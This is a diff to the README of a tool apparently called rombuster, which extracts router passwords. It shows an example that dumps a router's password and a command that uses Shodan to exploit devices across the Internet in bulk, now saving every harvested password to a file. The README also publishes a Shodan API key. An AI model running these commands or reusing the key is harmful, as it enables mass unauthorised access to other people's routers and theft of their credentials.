@@ -53,10 +53,10 @@ rombuster -a 192.168.2.1
 [i] (192.168.2.1) - password: SuperHardPassword999
 ```
 
-Let's try to use Shodan search engine to exploit devices over Internet, we will use it with `-t` for fast exploitation.
+Let's try to use Shodan search engine to exploit devices over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.
 
 ```shell
-rombuster -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD
+rombuster -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
 ```
 
 **NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)
